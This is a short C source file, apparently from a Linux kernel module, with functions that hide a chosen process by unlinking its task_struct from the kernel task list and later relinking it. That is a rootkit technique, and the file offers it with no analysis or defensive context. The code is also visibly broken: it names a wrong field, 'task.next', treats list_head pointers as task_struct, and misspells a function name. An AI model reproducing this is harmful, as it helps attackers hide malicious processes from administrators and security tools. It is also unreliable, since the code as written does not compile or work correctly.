#include <linux/sched.h>

static struct task_struct *process_hidden;

void hide_process(pid_t process_pid) {
  if (process_hidden) {
    printk(KERN_INFO "one process is already hidden, maximum limit reached");
    return;
  }
  
  struct task_struct *task;
  
  for_each_process(task) {
    if (task->pid != process_pid)
      continue;

    task->tasks.prev->tasks.next = task->task.next;
    task->tasks.next->tasks.prev = task->task.prev;
    process_hidden = task;
  }

  printk(KERN_INFO "process with pid %d is now hidden", process_pid);
}

void unnhide_process() {
  if (!process_hidden) {
    printk(KERN_INFO "no process is hidden");
    return;
  }
  
  struct task_struct *task;

  for_each_process(task) {
    if (task->pid == process_hidden->tasks.prev->pid)
      task->tasks.next = process_hidden;

    if (task->pid == process_hidden->tasks.next->pid)
      task->tasks.prev = process_hidden;
  }

  printk(KERN_INFO "process with pid %d is revealed", process_hidden->pid);
  process_hidden = NULL;
}
